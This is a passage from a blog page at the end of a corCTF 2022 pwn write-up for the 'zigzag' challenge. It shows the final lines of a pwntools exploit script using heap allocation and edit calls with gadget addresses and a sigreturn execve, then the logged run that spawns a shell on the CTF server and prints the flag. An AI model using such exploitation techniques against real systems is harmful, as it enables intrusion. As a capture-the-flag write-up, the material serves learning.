alloc(<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">0x400</span>, pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x203147</span>) <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x208000</span>) <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x20351b</span>) <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x1000</span>) <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x201fcf</span>) <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0xa</span>) <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x208000</span>))

edit(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x400</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x400</span> <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(stack<span style="color:#f92672">-</span><span style="color:#ae81ff">0xd0</span>)<span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>))

alloc(<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">1000</span>,pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x202d16</span>))
edit(<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">0x7</span>, pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x0000000000203715</span>))

io<span style="color:#f92672">.</span>interactive()

<span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">nasm@off:~/Documents/pwn/corCTF/zieg$ python3 remote.py REMOTE HOST=be.ax PORT=31278
</span><span style="color:#e6db74">[*] &#39;/home/nasm/Documents/pwn/corCTF/zieg/zigzag&#39;
</span><span style="color:#e6db74">    Arch:     amd64-64-little
</span><span style="color:#e6db74">    RELRO:    No RELRO
</span><span style="color:#e6db74">    Stack:    No canary found
</span><span style="color:#e6db74">    NX:       NX enabled
</span><span style="color:#e6db74">    PIE:      No PIE (0x200000)
</span><span style="color:#e6db74">[+] Opening connection to be.ax on port 31278: Done
</span><span style="color:#e6db74">[*] stack: 0x7ffe21d2cc68
</span><span style="color:#e6db74">[*] Loaded 37 cached gadgets for &#39;zigzag&#39;
</span><span style="color:#e6db74">[*] Using sigreturn for &#39;SYS_execve&#39;
</span><span style="color:#e6db74">[*] Switching to interactive mode
</span><span style="color:#e6db74">$ id
</span><span style="color:#e6db74">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
</span><span style="color:#e6db74">$ cat flag.txt
</span><span style="color:#e6db74">corctf{bl4Z1nGlY_f4sT!!}
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</code></pre></div>
                    
                    <HR width="100%" id="EOF">
		    <p style="color:#777;">Last modified on 2022-08-08</p>
                    
                </div>
            </div>
            
            
            <nav class="post-pagination">

                
                <a class="newer-posts">
			Next<br>No newer posts.
                </a>
                
                
                
                <a class="older-posts" href="/posts/cshell2/">
			Previous<br>[corCTF 2022 - pwn] cshell2
                </a>
                
            </nav>
            <div class="post-comment-wrapper">
                


<div id="gitalk-container"></div>









            </div>
        </div>
    </div>


                    </div>
            </div><div id="single-column-footer">
Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> by <a href="https://risehere.net/">Rise</a>
<br>
Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
<br>

&copy;
	
	Beerware shit
	
</div>
            </div>
    
    <script src="/js/journal.js"></script>
    </body>
</html>
